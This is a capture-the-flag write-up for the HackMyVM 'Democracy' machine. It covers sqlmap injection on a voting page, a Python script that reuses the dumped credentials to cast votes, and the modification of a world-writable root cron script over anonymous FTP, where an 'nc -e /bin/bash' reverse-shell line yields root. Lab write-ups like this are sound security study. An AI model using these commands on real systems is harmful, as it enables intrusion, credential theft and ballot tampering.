# Democracy-HMV: [Democracy](https://hackmyvm.eu/machines/machine.php?vm=Democracy)

---

## Overview

This write-up documents the compromise of the **Democracy** machine from HackMyVM.

High-level path:
- Enumerate HTTP voting application
- Use SQLi (via `vote.php`) to dump users
- Discover an **anonymous FTP** service exposing a world-writable script
- Abuse the script’s periodic execution to obtain a **root shell**
- Retrieve user + root flags

---

## Enumeration

### Nmap Scan

```
# Nmap 7.98 scan initiated Sun Jan  4 03:18:00 2026 as: /usr/lib/nmap/nmap --privileged -v -p- -sC -sV -T4 -oA /home/cool/HMV/democracy/scans/nmap-democracy-full -oN /home/cool/HMV/democracy/scans/nmap-democracy-full.log 192.168.56.107
Nmap scan report for democracy.hmv (192.168.56.107)
Host is up (0.011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
```

Later, a full port sweep also revealed FTP:

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### Observations

- SSH on **22**
- HTTP on **80**
- FTP on **21** (anonymous access)

---

## Web Enumeration (Port 80)

### Feroxbuster

```
feroxbuster -e -x txt,php,html,zip,htm,bak,pem -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://democracy.hmv -t 500 -o ferox-192.168.56.107.log
```

Interesting endpoints:

- `/login.php`
- `/register.php`
- `/vote.php` (redirects to login when unauthenticated)
- `/config.php`

The app allows user registration and voting.

---

## SQL Injection on vote.php (Database Dump)

After registering and obtaining a valid session, the cookie was reused to test parameters on `vote.php`.

### Reset Voting (Cookie-Based)

A quick loop can repeatedly reset voting state (example automation used during testing):

```python
#!/usr/bin/env python3
import requests
import time

URL = "http://democracy.hmv/vote.php"

cookies = {
    "PHPSESSID": "s7d8tsg9n900nojrrp5kgraspr",
    "voted": "1"
}

def main():
    session = requests.Session()
    session.cookies.update(cookies)

    while True:
        try:
            session.post(URL, data={"reset": "1"}, timeout=5)
        except requests.RequestException as e:
            print(f"[!] Request failed: {e}")
        time.sleep(0.1)

if __name__ == "__main__":
    main()
```

### sqlmap

Using the authenticated cookie and targeting the `candidate` parameter:

```
sqlmap --url "http://democracy.hmv/vote.php" --cookie "PHPSESSID=s7d8tsg9n900nojrrp5kgraspr; voted=1" --batch --dbms=mysql --dbs -p "candidate" --data "candidate=abc" --dump
```

The dump produced a `users.csv` file:

```
/home/cool/.local/share/sqlmap/output/democracy.hmv/dump/voting/users.csv
```

Usernames and passwords were extracted into two lists:

```
cat users.csv | cut -d "," -f 3 > username
cat users.csv | cut -d "," -f 2 > pass
```

### Automated Voting (Credential Reuse)

To quickly authenticate and vote as multiple users, a small script was used:

```python
#!/usr/bin/env python3
import sys
import requests

URL = "http://democracy.hmv"

def main():
    session = requests.Session()

    for line in sys.stdin:
        line = line.strip()
        if not line:
            continue

        try:
            user, password = line.split("\t", 1)
        except ValueError:
            print(f"[!] Skipping invalid line: {line}")
            continue

        resp = session.post(
            f"{URL}/login.php",
            data={"username": user, "password": password},
            allow_redirects=False
        )

        if not resp.cookies:
            print(f"[-] Login failed for {user}")
            session.cookies.clear()
            continue

        session.post(f"{URL}/vote.php", data={"candidate": "democrat"})
        print(f"[+] {user} has voted!")
        session.cookies.clear()

if __name__ == "__main__":
    main()
```

Run:

```
paste users pass | python3 script2.py
```

---

## FTP Discovery (Anonymous Access → Writable Script)

A follow-up scan showed port **21/tcp** open. Connecting via FTP as `anonymous`:

```
ftp 192.168.56.107
Name: anonymous
Password: anonymous
```

Listing files:

```
-rwxrwxrwx   1 root  root  258 Apr 30  2023 votes
```

The file is **world-writable** and owned by root.

The script content:

```
#! /bin/bash

## this script runs every minute ##

mysql -u root -pYklX69Vfa voting << EOF
SELECT COUNT(*) FROM votes WHERE candidate='republican';
SELECT COUNT(*) FROM votes WHERE candidate='democrat';
EOF

nc -e /bin/bash 192.168.0.29 4444
```

Key points:
- Comment indicates it **runs every minute** (cron-like).
- Runs MySQL commands as root (hardcoded password).
- Contains a netcat call intended to spawn a shell back.

Because the file is writable via anonymous FTP, it can be modified and uploaded back.

```
Change this line
nc -e /bin/bash {yourIP} 1234
PUT vote (back to ftp)
```

```zsh
nc -vnlp 1234
```
---

## Privilege Escalation (Cron + Writable Script → root)

The `votes` script was downloaded, edited (adjusting the callback target), and uploaded back to the FTP share.

A listener was started on the attacker machine and within the next minute the cron-executed script connected back, resulting in a root shell.

---

## Flags

### User Flag

```
/home/trump/user.txt
```

### Root Flag

```
/root/root.txt
```

---

## Conclusion

This machine highlights a classic real-world failure chain:

- Web application issues can expose data and widen the attack surface (SQLi and credential leakage).
- **Anonymous FTP + world-writable files** is extremely dangerous.
- A writable script executed periodically by root is effectively **root RCE**.

---

## Attack Path Summary

```
HTTP (80) → register/login → SQLi on vote.php (candidate) → dump users
           ↓
FTP (21) anonymous → world-writable root-owned script (votes)
           ↓
Script executed every minute → root shell
           ↓
Read user + root flags
```
